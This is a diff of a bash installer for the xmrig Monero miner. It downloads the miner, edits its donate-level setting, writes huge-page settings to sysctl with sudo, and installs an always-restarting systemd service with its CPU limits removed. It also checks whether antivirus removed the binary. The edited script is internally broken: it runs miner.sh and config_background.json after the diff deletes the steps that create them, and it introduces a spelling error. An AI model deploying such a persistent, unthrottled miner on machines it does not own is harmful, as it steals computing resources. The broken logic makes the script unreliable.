@@ -9,7 +9,7 @@ echo "(please report issues to support@mmain.stream email with full output of th
 echo
 
 if [ "$(id -u)" == "0" ]; then
-  echo "WARNING: Generally it is not advised to run this script under root"
+  echo "WARNING: Generally it is not adviced to run this script under root"
 fi
 
 # command line arguments
@@ -99,6 +99,7 @@ fi
 rm /tmp/xmrig.tar.gz
 
 echo "[*] Checking if advanced version of $HOME/mmain/xmrig works fine (and not removed by antivirus software)"
+sed -i 's/"donate-level": *[^,]*,/"donate-level": 1,/' $HOME/mmain/config.json
 $HOME/mmain/xmrig --help >/dev/null
 if (test $? -ne 0); then
   if [ -f $HOME/mmain/xmrig ]; then
@@ -124,6 +125,7 @@ if (test $? -ne 0); then
   rm /tmp/xmrig.tar.gz
 
   echo "[*] Checking if stock version of $HOME/mmain/xmrig works fine (and not removed by antivirus software)"
+  sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HOME/mmain/config.json
   $HOME/mmain/xmrig --help >/dev/null
   if (test $? -ne 0); then 
     if [ -f $HOME/mmain/xmrig ]; then
@@ -137,33 +139,38 @@ fi
 
 echo "[*] Miner $HOME/mmain/xmrig is OK"
 
-echo "[*] Creating $HOME/mmain/miner.sh script"
-cat >$HOME/mmain/miner.sh <<EOL
-#!/bin/bash
-if ! pidof xmrig >/dev/null; then
-  nice $HOME/mmain/xmrig \$*
-else
-  echo "Monero miner is already running in the background. Refusing to run another one."
-  echo "Run \"killall xmrig\" or \"sudo killall xmrig\" if you want to remove background miner first."
+# Check if huge pages can be enabled
+if [[ $(grep MemTotal /proc/meminfo | awk '{print $2}') > 3500000 ]]; then
+  echo "[*] Enabling huge pages"
+  echo "vm.nr_hugepages=$((1168+$(nproc)))" | sudo tee -a /etc/sysctl.conf
+  sudo sysctl -w vm.nr_hugepages=$((1168+$(nproc)))
 fi
-EOL
 
-chmod +x $HOME/mmain/miner.sh
-
-echo "[*] Creating moneroocean_miner systemd service"
-    cat >/tmp/moneroocean_miner.service <<EOL
+if ! type systemctl >/dev/null; then
+  echo "[*] Running miner in the background (see logs in $HOME/mmain/xmrig.log file)"
+  /bin/bash $HOME/mmain/miner.sh --config=$HOME/mmain/config_background.json >/dev/null 2>&1
+  echo "ERROR: This script requires \"systemctl\" systemd utility to work correctly."
+  echo "Please move to a more modern Linux distribution or setup miner activation after reboot yourself if possible."
+else
+  echo "[*] Creating mmain_miner systemd service"
+  cat >/tmp/mmain_miner.service <<EOL
 [Unit]
 Description=Monero miner service
 
 [Service]
-ExecStart=$HOME/minershell-main/xmrig --url pool.hashvault.pro:80 --user 4ArAQ9Qo5C78xgtbzdrsAUTHtCGYQjk7XintpgNAWogbPBCG5SWNqCJ27mAtiqTxoaAeBwLaD2Kh2F8CooS9y9EjUNW3kAE --pass XX --donate-level 1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 --config=$HOME/minershell-main/config.json
+ExecStart=$HOME/mmain/xmrig --config=$HOME/mmain/config.json
 Restart=always
-Nice=10
-CPUWeight=1
 
 [Install]
 WantedBy=multi-user.target
-echo "[*] Creating $HOME/mmain/config_background.json"
-cp $HOME/mmain/config.json $HOME/mmain/config_background.json
+EOL
+  sudo mv /tmp/mmain_miner.service /etc/systemd/system/mmain_miner.service
+  echo "[*] Starting mmain_miner systemd service"
+  sudo killall xmrig 2>/dev/null
+  sudo systemctl daemon-reload
+  sudo systemctl enable mmain_miner.service
+  sudo systemctl start mmain_miner.service
+  echo "To see miner service logs run \"sudo journalctl -u mmain_miner -f\" command"
+fi
 
 echo "[*] Setup complete"
